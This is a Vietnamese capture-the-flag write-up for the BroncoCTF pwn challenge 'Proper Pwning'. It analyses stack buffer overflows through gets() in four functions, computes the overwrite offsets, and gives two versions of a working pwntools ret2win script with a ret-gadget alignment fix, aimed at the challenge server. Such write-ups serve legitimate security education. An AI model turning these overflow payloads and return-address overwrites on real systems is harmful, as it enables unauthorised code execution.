Giải đấu: BroncoCTF

Tên bài: Proper Pwning

Mảng: Pwn

Mô tả: Have you read the Pwntorial? Ready to graduate from baby pwns?

This should do it. Three gates and a treasure room await your input.

Dạng flag: bronco{...}

### 📂 Tài nguyên bài tập
Bạn có thể tải các file tại đây để thực hành:
* [Toàn bộ file (proper.zip)](./proper.zip)
* [Script khai thác (script_Proper_Pwning.py)](./script_Proper_Pwning.py)

__1. PHÂN TÍCH FILE__ 

Khi mà dùng lệnh _`checksec [ten_file]`_ thì chúng ta được ảnh như bên dưới

<img width="630" height="271" alt="image" src="https://github.com/user-attachments/assets/901e8170-7c70-4749-a87d-a4e9397f7f45" />

__-> Thấy được chỉ bật cơ chế bảo mật là SHSTK và IBT__

__2. PHÂN TÍCH MÃ NGUỒN__

<img width="1040" height="798" alt="image" src="https://github.com/user-attachments/assets/9ae9bce8-1059-4aa3-9c18-b60641ec8745" />

__``HÀM GATE1()``__

<img width="587" height="222" alt="image" src="https://github.com/user-attachments/assets/9cb0f092-d996-4333-b5a8-71271b360abc" />

<img width="1010" height="581" alt="image" src="https://github.com/user-attachments/assets/b397947b-1461-4e34-876c-bd4ef33fa140" />

__-> Ở ``gate1`` chúng ta có thể thấy rằng 1 lỗi __``Stack Buffer Overflow``__ kinh điển ngay tại hàm __``gets(buffer)``__. Mục đích của chúng ta sẽlàm tràn biến ``buffer`` và ghi đè lên biến ``gate`` thành 1 để nhảy xuống ``else`` với ``buffer[64] tại rbp-0x110, gate tại rbp-0x4 -> offset = 0x110-0x4 = 268``__

__``HÀM GATE2()``__

<img width="716" height="303" alt="image" src="https://github.com/user-attachments/assets/61f8bccf-0603-428d-816b-f3003fc538ed" />

<img width="831" height="708" alt="image" src="https://github.com/user-attachments/assets/d34029e9-9bd0-4a73-b3e7-370b985b4609" />

__-> Ở ``gate2`` cũng mắc phải lỗi giống như ở ``gate1`` tại hàm __``gets(buffer)``__ không kiểm tra kích thước dữ liệu đầu vòa gây ra lỗi __``Stack Buffer Overflow``__. Mục đích của chúng ta sẽ làm tràn biến ``buffer`` -> ghi đè lên biến ``baby_chicken`` bằng giá trị hợp lệ ``0x29`` -> ghi đè lên biến ``gate`` bằng ``1`` để vượt qua ``gate2`` với ``buffer[64] tại rbp-0x210, baby_chicken tại rbp-0x8, gate tại rbp-0x4``__ 

__-> Offset buffer -> chicken = 0x210-0x8 = 520, rồi 4 byte chicken, rồi 4 byte gate__

__``HÀM GATE3()``__

<img width="1211" height="288" alt="image" src="https://github.com/user-attachments/assets/f36b06cc-e6e3-4715-9b2c-6aa1d87097a5" />

<img width="1197" height="698" alt="image" src="https://github.com/user-attachments/assets/95948e7e-2fa6-4c98-a511-ea8947a3c736" />

__-> Ở ``gate3`` cũng mắc phải lỗi giống như ở ``gate1`` tại hàm __``gets(buffer)``__ không kiểm tra kích thước dữ liệu đầu vòa gây ra lỗi __``Stack Buffer Overflow``__. Mục tiêu bây giờ sẽ làm tràn biến ``buffer`` -> ghi đè lên biến ``gate`` bằng giấ trị ``13371337`` để nhảy xuống nhánh ``else`` và để vượt qua được ``gate3`` với ``buffer[67] tại rbp-0x50, gate tại rbp-0x4 -> offset = 0x50-0x4 = 76``__

__``HÀM TREASURE_ROOM()``__

<img width="747" height="132" alt="image" src="https://github.com/user-attachments/assets/be6e0391-077e-4d0b-b751-ce15f1e3fd18" />

<img width="835" height="367" alt="image" src="https://github.com/user-attachments/assets/86d4ffe2-af11-4996-95cf-032f4c3fda73" />

__-> Có thể thấy rằng ở trong mã nguồn C++ thì biến ``buffer`` được cấp phát với ``6767 bytes`` thế nhưng ở trong asm lại là ``6768 bytes (0x1a70)`` -> Vì trình biên dịch làm tròn lên theo một số quy tắc alignment để tối ưu truy cập bộ nhớ và giữ cho stack frame luôn thẳng hàng (aligned) theo 16-byte tại các điểm gọi hàm.__

__-> Ở hàm ``treasure_room`` cùng bị mắc 1 lỗi kinh điển giống ``gate1`` tại hàm __``gets(buffer)``__ không kiểm tra kích thước dữ liệu đầu vòa gây ra lỗi __``Stack Buffer Overflow``__. Muc tiêu bây giờ là làm tràn biến ``buffer`` -> Ghi đè địa chỉ hàm __``win()``__ để lấy flag

<img width="376" height="277" alt="image" src="https://github.com/user-attachments/assets/e4e20115-1946-4f9d-8a71-c516a5e691f1" />

<img width="908" height="245" alt="image" src="https://github.com/user-attachments/assets/642df3f7-28c6-49bd-9450-6a68a522d763" />

__-> Sau khi mở mã nguồn thì ta thấy được chương trình này sẽ kiểm tra qua 3 cửa -> Vượt qua được 3 cửa thì sẽ gọi hàm __``treasure_room()``____

__``KẾ HOẠCH TẤN CÔNG``__

  __* Làm cho hàm ``gate1`` phải trả về giá trị ``1`` với payload ``p.sendline(b"A" * 268 + p32(1))``__

  __* Sau khi đã vượt qua được ``gate1`` tới với ``gate2`` như đã phân tích ở trên ta sẽ có payload phức tạp hơn xíu ``p.sendline(b"A" * 520 + p32(0x29) + p32(1))``__

  __* Tới với ``gate3`` sẽ có payload như sau ``p.sendline(b"A" * 76 + p32(0xcc07c9))``. Khi đã vượt qua được ``gate3`` thì chương trình sẽ in ra địa chỉ của hàm ``win()``__

  __* Khi đã vượt qua cả 3 hàm gate thì chương trình sẽ nhảy xuống hàm ``treasure_room()``. Tới đây ta sẽ viết chuỗi kí tự rác dài ``6768 bytes (0x1a70)`` có payload như sau ``payload = b"A" * (6768 + 8) + p64(win_addr)``__

__3. THỰC HIỆN KẾ HOẠCH__

Sau khi lắp ráp hết các payload để vượt qua các gate thì ta có 1 payload hoàn chỉnh như sau

```python
from pwn import *
context.log_level = 'debug'
context.binary = './proper'

# p = process('./proper')     
p = remote('0.cloud.chals.io', 21543)
p.sendline(b"A" * 268 + p32(1))

p.sendline(b"A" * 520 + p32(0x29) + p32(1))

p.sendline(b"A" * 76 + p32(0xcc07c9))

win_addr = 0x40123b
payload = b"A" * (6768 + 8) + p64(win_addr)
p.sendline(payload)

p.interactive()
```

<img width="1262" height="627" alt="image" src="https://github.com/user-attachments/assets/e527ad51-d6b2-449a-8ff9-054b648a7113" />

Thế nhưng khi chạy xong đoạn python đó chương trình lại crash một cách kì lạ mặc dù đã in ra dòng banner, đúng địa chỉ hàm ``win()`` cũng như là offset đã chuẩn hết vì đã vượt qua và vào được hàm ``win()``

<img width="932" height="86" alt="image" src="https://github.com/user-attachments/assets/f8512f2d-901b-4665-9dc0-e431c9b282f5" />

Á à thủ phạm chính là hàm ``system`` khi ta chạy đến nó thì nó đã làm crash vì đã đụng vào ``movaps `` gây ra ``lỗi alignment`` bắt buộc phải ``RSP % 16 == 8`` nên chúng ta cần có địa chỉ của lệnh ``ret gadget`` đơn lẻ bằng cách dùng ``objdump -d <tên_file> | grep "ret"``

<img width="628" height="321" alt="image" src="https://github.com/user-attachments/assets/4dc83fe6-cd69-4f62-886e-161dc4b5fbd4" />

__-> Từ đó ta lấy đại 1 địa chỉ đơn lẻ làm ``ret gadget`` để căn chỉnh bộ nhớ__

__-> Đoạn mã python chốt hạ của chúng ta là:__

```python 
from pwn import *
context.log_level = 'debug'
context.binary = './proper'

# p = process('./proper')     
p = remote('0.cloud.chals.io', 21543)
p.sendline(b"A" * 268 + p32(1))

p.sendline(b"A" * 520 + p32(0x29) + p32(1))

p.sendline(b"A" * 76 + p32(0xcc07c9))

win_addr = 0x40123b
ret_gadget = 0x40101a  
payload = b"A" * (6768 + 8) + p64(ret_gadget) + p64(win_addr)
p.sendline(payload)

p.interactive()
```
